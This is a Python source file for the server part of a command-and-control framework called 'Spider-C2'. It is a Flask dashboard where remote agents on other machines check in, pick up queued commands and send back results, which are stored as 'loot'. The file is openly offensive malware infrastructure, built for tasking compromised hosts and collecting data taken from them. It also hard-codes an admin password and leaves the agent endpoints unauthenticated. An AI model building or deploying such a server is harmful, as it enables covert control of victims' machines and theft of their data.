"""
Spider-C2 Module : Server
Flask web dashboard for agent management.
"""

from flask import Flask, render_template, request, jsonify, session, redirect, url_for
from datetime import datetime
import json
import os
import hashlib

class C2Server:
    def __init__(self, config):
        self.config = config
        self.app = Flask(__name__)
        self.app.secret_key = config["server"]["secret_key"]
        self.agents = {}
        self.commands = {}
        self.loot = {}
        self.setup_routes()

    def setup_routes(self):
        @self.app.route("/")
        def index():
            if not session.get("logged_in"):
                return redirect(url_for("login"))
            return render_template("index.html", agents=self.agents)

        @self.app.route("/login", methods=["GET", "POST"])
        def login():
            if request.method == "POST":
                username = request.form.get("username")
                password = request.form.get("password")
                if username == "admin" and password == "SpiderC2-2024!":
                    session["logged_in"] = True
                    return redirect(url_for("index"))
                return render_template("login.html", error="Invalid credentials")
            return render_template("login.html")

        @self.app.route("/logout")
        def logout():
            session.pop("logged_in", None)
            return redirect(url_for("login"))

        @self.app.route("/api/checkin", methods=["POST"])
        def api_checkin():
            data = request.json
            agent_id = data.get("agent_id")
            hostname = data.get("hostname", "Unknown")
            ip = request.remote_addr
            self.agents[agent_id] = {
                "hostname": hostname,
                "ip": ip,
                "os": data.get("os", "Unknown"),
                "last_seen": datetime.now().isoformat()
            }
            pending = self.commands.get(agent_id, [])
            return jsonify({"status": "ok", "commands": pending})

        @self.app.route("/api/submit", methods=["POST"])
        def api_submit():
            data = request.json
            agent_id = data.get("agent_id")
            result = data.get("result", "")
            if agent_id not in self.loot:
                self.loot[agent_id] = []
            self.loot[agent_id].append({
                "timestamp": datetime.now().isoformat(),
                "data": result
            })
            return jsonify({"status": "ok"})

        @self.app.route("/api/command", methods=["POST"])
        def api_command():
            if not session.get("logged_in"):
                return jsonify({"status": "error", "message": "Unauthorized"}), 401
            data = request.json
            agent_id = data.get("agent_id")
            command = data.get("command")
            if agent_id not in self.commands:
                self.commands[agent_id] = []
            self.commands[agent_id].append(command)
            return jsonify({"status": "ok"})

    def run(self):
        self.app.run(
            host=self.config["server"]["host"],
            port=self.config["server"]["port"],
            debug=False
        )
